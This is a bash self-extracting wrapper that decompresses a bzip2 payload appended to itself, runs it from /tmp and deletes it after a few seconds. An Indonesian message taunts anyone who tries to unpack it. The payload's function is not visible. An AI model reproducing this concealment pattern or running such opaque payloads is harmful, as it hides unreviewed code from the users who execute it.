#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY��B  �_�<�}���?�߾?���  �� 0 @��֊�I�4�L�z `  �b0 4Hjz5O�ɨ��&����i���i��� �C@i�  	$&� �i���mOI�F@M�i����SA�!��m�ǧ[��$Nos/��z�4���,�=���H��?������G1��/6�~��oϷT���Y������LRMt��s���L��%b�̇�/�HYD�n��3,���޻��q��c.���빯Qy�^ǫ}��mn�<�a#���В�y�8�	��0�d�M����Y��*��i�wݨvzZE�ac:8��`US9���@@�A;�a���)Xܘ1&�24�"�P�g�C��Fka %R�pIj���fm�-��Z�52�V+.f��X�-Į���r�=G$�¿��]8[`x	6�`u�$5��`�3S��y�&݅5��e��>�dq�0��~6�'��0h�����8�q���f�..E��u�뜢DJ�Yd֞(K}Z��<`�9U�	1t�DT� 5Z�n'7�����5��3?�KBJ���ﾠWo�����(��M+�@�at�h%A��<A�J	ēũ�@@��V����d���㱣�FT"zz1�!��t�d%�(�vt������b�F�A�e/A�Ǚ&v��=v�Őa���i&i����(��ܜa��v���7�؍}�"Q�D��n�������$-��2����nfs�L�	{<bG� ���:�x�$�(#���rE8P���B